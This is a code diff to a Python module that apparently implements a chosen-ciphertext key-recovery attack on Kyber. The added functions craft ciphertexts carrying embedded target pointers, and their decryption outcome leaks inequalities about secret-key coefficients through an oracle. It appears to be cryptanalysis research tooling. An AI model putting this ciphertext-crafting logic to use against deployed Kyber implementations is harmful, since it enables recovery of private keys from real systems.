@@ -82,7 +82,9 @@ def read_sk(filename):
     return sk
 
 
-def build_polymsg_from_oracle(oracle, val_for_one, use_random) -> Poly:
+def build_polymsg_from_oracle(
+    oracle, val_for_one, use_random, target_ptr_idx=0
+) -> Poly:
     """
     Create a message encoded in polynomial that should appear for
     victim. The first 64-bit contain a target pointer that is computed
@@ -99,11 +101,12 @@ def build_polymsg_from_oracle(oracle, val_for_one, use_random) -> Poly:
     for pointer_idx in range(4):
         # Extra entropy for blocks 1-3 (block 0 is deterministic)
         extra_rand64 = 0
-        if use_random and pointer_idx:
+        if use_random and pointer_idx != target_ptr_idx:
             # keep regenerating until it does NOT cancel the message bit
             while True:
                 extra_rand64 = random.getrandbits(64) & 0xFFFF00
-                if extra_rand64 ^ (1 << oracle.lowest_message_bit):
+                extra_rand64 ^= 1 << oracle.lowest_message_bit
+                if extra_rand64:
                     break
 
         for byte_idx in range(8):
@@ -138,6 +141,13 @@ def build_arbitrary_combination_ciphertext(
     u = PolyVec()
 
     v = build_polymsg_from_oracle(oracle, KYBER_Q // 2 + 1, use_random=True)
+    # m_list = list(map(lambda x: int(x != 0), v.coeffs))
+    # m = bytearray(32)
+    # for pos in range(len(m_list)):
+    #     m[pos // 8] = m[pos // 8] | ((m_list[pos]) << (pos & 7))
+    # for i in range(4):
+    #     print(f"{m[i * 8 : (i + 1) * 8]}", end=" ")
+    # print("")
     mask = KYBER_N - 1
     for i in range(weight):
         u_coef = z_values[i]
@@ -155,6 +165,42 @@ def build_arbitrary_combination_ciphertext(
     threshold_k = 4 - threshold_value
     v_offset = oracle.lowest_message_bit
     v.coeffs[v_offset] += threshold_k * k_step
+    return pack_ciphertext(u, v)
+
+
+def build_naive_ciphertext(
+    z_value: int,
+    threshold_value: int,
+    k_step: int,
+    block_idx: int,
+    oracle: KyberOracle,
+):
+    """Create a ciphertext that for Kyber should decrypt to a message m,
+    where m[lowest_message_bit] bit depends whether inequality
+    involving sk[idx] for idx from sk_idxs is satisfied
+    """
+    u = PolyVec()
+
+    v = build_polymsg_from_oracle(
+        oracle, KYBER_Q // 2 + 1, use_random=True, target_ptr_idx=block_idx
+    )
+    # m_list = list(map(lambda x: int(x != 0), v.coeffs))
+    # m = bytearray(32)
+    # for pos in range(len(m_list)):
+    #     m[pos // 8] = m[pos // 8] | ((m_list[pos]) << (pos & 7))
+    # for i in range(4):
+    #     print(f"{m[i * 8 : (i + 1) * 8]}", end=" ")
+    # print("")
+    mask = KYBER_N - 1
+    u_coef = z_value
+    u.vec[block_idx].coeffs[0] = u_coef
+
+    # Usually decryption failure is triggered by adding Q/4 noise to v,
+    # but here we modify it to Q/4 +- Q/16 * k for Kyber512 and
+    # Kyber768
+    threshold_k = threshold_value
+    v_offset = oracle.lowest_message_bit
+    v.coeffs[v_offset] = threshold_k * k_step
     return pack_ciphertext(u, v)
 
 
